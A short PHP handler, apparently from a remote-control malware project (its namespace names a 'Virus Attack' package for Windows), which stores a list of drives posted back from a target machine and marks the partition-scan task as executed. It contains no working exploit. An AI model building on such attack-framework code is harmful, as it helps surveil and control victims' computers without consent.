<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ScanPartitions\ScanPartitions $this */

$this->setAvailableDrives($this->requestData->postCheck("drives"));
$this->setExecuted();
